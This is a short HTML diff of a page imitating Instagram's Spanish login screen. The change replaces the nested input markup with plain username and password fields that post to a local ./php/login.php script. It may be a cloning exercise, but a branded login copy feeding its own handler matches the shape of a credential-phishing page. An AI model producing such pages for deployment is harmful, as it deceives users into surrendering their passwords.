@@ -31,7 +31,7 @@
                 <img src="img/logo.png" alt="Instagram Logo">
             </div>
             <form action="./php/login.php" method="post">
-                <div class="_ab32">
+                <!-- <div class="_ab32">
                     <div class="input_div">
                         <label class="label username_label" id="123">
                             <span class="_aa4a">
@@ -50,9 +50,12 @@
                             <input aria-required="true" type="password" name="password" id="password" aria-label="Contraseña" class="_add6">
                         </label>
                     </div>
-                </div>
+                </div> -->
+                <input  type="text" name="username" id="username" placeholder="Telefono, usuario o correo electrónico" class=" _add9">
 
-                <!-- <input type="submit" name="submit" value="Entrar"> -->
+                <input type="password" name="password" id="password" placeholder="Contraseña" class="_add9">
+
+                <input type="submit" name="submit" value="Entrar">
                 <div class="other-option">
                     <div></div>
                     <p>O</p>
